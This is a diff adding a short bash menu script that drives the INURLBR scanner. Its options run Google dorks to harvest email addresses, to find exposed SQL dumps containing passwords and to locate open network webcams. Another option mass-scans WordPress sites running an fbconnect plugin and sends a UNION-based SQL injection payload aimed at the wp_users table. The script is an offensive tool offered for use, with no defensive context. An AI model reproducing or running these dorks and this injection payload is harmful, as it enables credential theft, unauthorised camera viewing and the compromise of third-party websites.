@@ -1,0 +1,32 @@
+#!/bin/bash
+echo '''
+                                           ______                                  
+                                         .-.      .-.                               
+                                        /            \                              
+                                       |  [ INURLBR+] |                             
+                                       |,  .-.  .-.  ,|                             
+                                       | )(|_/  \|_)( |                             
+                                       |/     /\     \|                             
+              _                        (_     ^^     _)                             
+                                 _\ ____) \_______\__|IIIIII|__/_______________________________     
+                         (_)[___]{}<________|-\IIIIII/-|__INURL__INURL__INURL___________\    
+       /                      )_/        \          /                               
+                                          \ ______ /''' 
+echo
+echo
+echo '(1- scan email dorks gmail-yahoo-hotmail           (2-scan dork website random   '
+echo '(3- search webcam random                           (4-scan website facebook '
+read -p 'test2>>'  menu
+if [ "$menu" == 1 ]
+then 
+/inurlbr.php --dork 'email (gmail|hotmail|yahoo) ext:txt' -s scan1.txt -m
+elif [ "$menu" == 2 ]
+then 
+./inurlbr.php --dork 'intext:password email (gmail|hotmail|yahoo) ext:sql' -s scan.txt --ifcode 200
+elif [ "$menu" == 3 ]
+then 
+php ./inurlbr.php --dork 'inurl:"ViewerFrame?Mode=Motion" & intitle:"Network Camera"' -s can.log -t 2000 -a 'Resolution'
+elif [ "$menu" == 4 ]
+then 
+ php ./inurlbr.php --dork 'inurl:"?fbconnect_action=" ' -s sqli.txt -q 1,6 --exploit-get '/?fbconnect_action=myhome&fbuserid=1 and 1=2 union select 1,2,3,4,5,group_concat(0x78706c5f73756363657373),7,8,9,10,11,12 from wp_users where id > 0' -t 2 -s 'xpl_success' --unique
+fi
